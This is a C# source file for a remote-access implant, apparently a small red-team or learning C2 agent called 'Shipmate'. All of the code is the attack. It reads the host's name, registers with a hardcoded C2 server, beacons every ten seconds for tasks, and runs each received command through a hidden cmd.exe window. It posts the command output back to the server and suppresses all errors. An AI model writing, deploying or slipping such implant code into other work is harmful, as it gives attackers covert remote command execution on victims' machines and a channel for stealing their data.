using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace TheShipImplant
{
    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        static extern bool GetComputerName(StringBuilder lpBuffer, ref uint lpnSize);

        private static readonly HttpClient client = new HttpClient();
        private static string c2Server = "http://10.0.1.5:8000";
        private static string agentId = "";

        static async Task Main(string[] args)
        {
            Console.WriteLine("[*] Starting Shipmate Implant...");

            // 1. Get Hostname via Native API
            StringBuilder hostnameBuffer = new StringBuilder(256);
            uint size = 256;
            GetComputerName(hostnameBuffer, ref size);
            string hostname = hostnameBuffer.ToString();

            // 2. Build JSON string manually (IP Address Removed)
            string jsonString = $"{{\"hostname\":\"{hostname}\"}}";
            var content = new StringContent(jsonString, Encoding.UTF8, "application/json");

            try
            {
                // 3. Register with C2
                HttpResponseMessage response = await client.PostAsync($"{c2Server}/implant/register", content);
                string result = await response.Content.ReadAsStringAsync();

                // 4. Parse the return JSON using Regex
                Match match = Regex.Match(result, @"""agent_id"":\s*""([^""]+)""");
                if (match.Success)
                {
                    agentId = match.Groups[1].Value;
                    Console.WriteLine($"[+] Registered successfully as: {agentId}");
                }
                else
                {
                    Console.WriteLine("[-] Failed to parse agent_id from server response.");
                    return;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Failed to connect to C2: {ex.Message}");
                return;
            }

            // 5. The Beaconing Loop
            while (true)
            {
                await FetchAndExecuteTasks();
                await Task.Delay(10000);
            }
        }

        static async Task FetchAndExecuteTasks()
        {
            try
            {
                HttpResponseMessage response = await client.GetAsync($"{c2Server}/implant/{agentId}/tasks");
                string json = await response.Content.ReadAsStringAsync();

                if (json.Contains("\"tasks_to_run\":[]") || json.Contains("\"tasks_to_run\": []"))
                {
                    return;
                }

                Match match = Regex.Match(json, @"""command""\s*:\s*""([^""]+)""");
                if (match.Success)
                {
                    string command = match.Groups[1].Value.Replace("\\\\", "\\");
                    Console.WriteLine($"\n[+] Task received: {command}");

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = $"/c {command}";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    string finalOutput = string.IsNullOrWhiteSpace(output) ? error : output;
                    Console.WriteLine($"[*] Execution complete. Returning results...");

                    string safeOutput = finalOutput.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
                    string safeCommand = command.Replace("\\", "\\\\").Replace("\"", "\\\"");

                    string resultJson = $"{{\"command\":\"{safeCommand}\", \"output\":\"{safeOutput}\"}}";
                    var content = new StringContent(resultJson, Encoding.UTF8, "application/json");

                    await client.PostAsync($"{c2Server}/implant/{agentId}/results", content);
                }
            }
            catch (Exception)
            {
                // Total silence
            }
        }
    }
}